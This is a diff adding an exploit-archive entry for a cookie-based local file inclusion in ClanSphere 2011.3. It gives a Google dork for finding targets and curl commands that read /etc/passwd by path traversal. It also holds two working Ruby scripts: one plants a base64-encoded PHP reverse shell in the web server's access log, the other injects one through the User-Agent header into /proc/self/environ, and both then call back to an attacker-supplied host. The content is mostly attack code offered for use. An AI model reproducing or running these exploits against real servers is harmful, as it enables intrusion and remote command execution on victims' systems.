@@ -1,0 +1,143 @@
+id: 19625
+date: 10/24/2012
+title: ClanSphere 2011.3 Local File Inclusion / Remote Code Execution Vulnerabilities
+author: blkhtc0rp
+cves: 
+
+Exploit Title: ClanSphere 2011.3 (cs_lang cookie parameter) Local File Inclusion Vulnerability
+Google Dork: "Copyright 2012 Seitentitel. All rights reserved." || inurl:index.php?mod=clansphere
+Date: 10/24/2012
+Author: Marco Tulio ~> blkhtc0rp
+Vendor Homepage: http://www.csphere.eu
+Version: 2011.3
+Tested on: Centos 5.7, Ubuntu 8.04 and FreeBSD 8
+
+
+Description: ClanSphere version 2011.3 contains a flaw which allow an attacker to execute commands and code due its cs_lang cookie parameter that is not properly sanitized. Prior versions should also be affected.
+
+
+
+Poc:
+curl "http://www.xxx-test.eu/" -b "blah=blah; cs_lang=../../../../../../../../../../../../../../../../etc/passwd%00.png"
+curl "http://www.xxx-test.eu/" -b "blah=blah; cs_lang=../../../../../../../../../../../../../../../../etc/passwd"
+curl "http://www.xxx-test.eu/" -b "blah=blah; cs_lang=../../../../../../../../../../../../../../../../etc/passwd%00"
+
+
+
+Exploit 1:
+
+#!/usr/bin/ruby
+
+#
+# ClanSphere 2011.3 (cs_lang cookie parameter) LFI exploit by blkhtc0rp
+#
+#
+# ./clanSphere.rb "http://172.16.255.134/apps/clansphere_2011.3/" "/var/log/httpd/access_log" 192.168.1.221 12345
+# [x] ClanSphere 2011.3 LFI Exploit
+# [x] Author: blkhtc0rp
+# [x] Reverse shell on 192.168.1.221:12345
+#
+#
+# nc -lp 12345
+# pwd
+# /var/www/html/apps/clansphere_2011.3
+# id
+# uid=48(apache) gid=48(apache) groups=48(apache)
+#
+require 'net/http'
+require 'base64'
+
+host = ARGV[0]
+log = ARGV[1]
+ip = ARGV[2]
+rev_port = ARGV[3]
+
+abort("Usage: #{$0} <url> <log> <your_ip> <port>") unless ARGV.size == 4
+
+uri = URI.parse(host)
+
+cookie = "blah=blah; cs_lang=../../../../../../../../../../../../../../../.." + log + "%00.png"
+headers = { 'Cookie' => cookie, 
+            'User-Agent' => 'Mozilla/4.0 (PSP (PlayStation Portable); 5.03)' 
+          }
+
+# Tiny shell from the net lol. 
+shell = "\$ip = \'#{ip}\';\$port = #{rev_port}; if (!(\$sock=fsockopen(\$ip,\$port))) die; while(!feof(\$sock)){ \$command = fgets(\$sock);\$pipe = popen(\$command,'r'); while (!feof(\$pipe)) fwrite (\$sock, fgets(\$pipe)); pclose(\$pipe);}fclose(\$sock);"
+
+enc = Base64.encode64(shell).gsub("\n",'')
+sh_encoded = "<?php eval(base64_decode(#{enc}));?>"
+
+
+puts "[x] ClanSphere 2011.3 LFI Exploit"
+puts "[x] Author: blkhtc0rp"
+puts "[x] Reverse shell on #{ip}:#{rev_port}"
+
+# Inject base64 shell
+req = Net::HTTP::Get.new(sh_encoded)
+status = Net::HTTP.new(uri.host, uri.port).start do |http|
+   http.request(req)
+end
+
+# Exec shell
+req2 = Net::HTTP::Get.new(uri.path, headers)
+status = Net::HTTP.new(uri.host, uri.port).start do |http|
+   http.request(req2)
+end
+
+
+
+Exploit 2 /proc/self/environ:
+
+
+
+#!/usr/bin/ruby                                                                               
+                                                                                              
+# ClanSphere 2011.3 (cs_lang cookie parameter) LFI exploit by blkhtc0rp                                 
+# Prior versions should also be affected.
+#
+# ./clanSphere-poc2.rb "http://victim.com.br/" 127.0.0.1:8118 rhost.com.br 44444
+# [x] ClanSphere 2011.3 (cs_lang) LFI exploit
+# [x] Author: blkhtc0rp
+# [x] Injecting malicious code into /proc/self/environ...
+# [x] Launching reverse shell on rhost.com.br:44444...
+#
+# nc -vv -l 44444
+# Connection from victim.com.br port 44444 [tcp/*] accepted
+# id
+# uid=48(apache) gid=48(apache) groups=48(apache)
+#
+require 'net/http'
+require 'base64'
+
+url = ARGV[0]
+proxy = ARGV[1]
+rhost = ARGV[2]
+rport = ARGV[3]
+
+
+uri = URI.parse(url)
+
+px_addr, px_pt = proxy.split(/:/) if proxy
+
+cookie = "blah=blah; cs_lang=../../../../../../../../../../../../../../../../proc/self/environ%00.png"
+
+
+shell = "<?php \$ip = \'#{rhost}\';\$port = #{rport}; if (!(\$sock=fsockopen(\$ip,\$port))) die; while(!feof(\$sock)){ \$command = fgets(\$sock);\$pipe = popen(\$command,'r'); while (!feof(\$pipe)) fwrite (\$sock, fgets(\$pipe)); pclose(\$pipe);}fclose(\$sock);?>"
+
+
+headers = { 'Cookie' => cookie,
+            'User-Agent' => shell
+          }
+
+puts "[x] ClanSphere 2011.3 (cs_lang) LFI exploit"
+puts "[x] Author: blkhtc0rp"
+puts "[x] Injecting malicious code into /proc/self/environ..."
+puts "[x] Launching reverse shell on #{rhost}:#{rport}..."
+
+req = Net::HTTP::Post.new(uri.path, headers)
+
+status = Net::HTTP.new(uri.host, uri.port, px_addr, px_pt).start do |http|
+   http.request(req)
+end
+
+#  0day.today [2023-03-26]  #
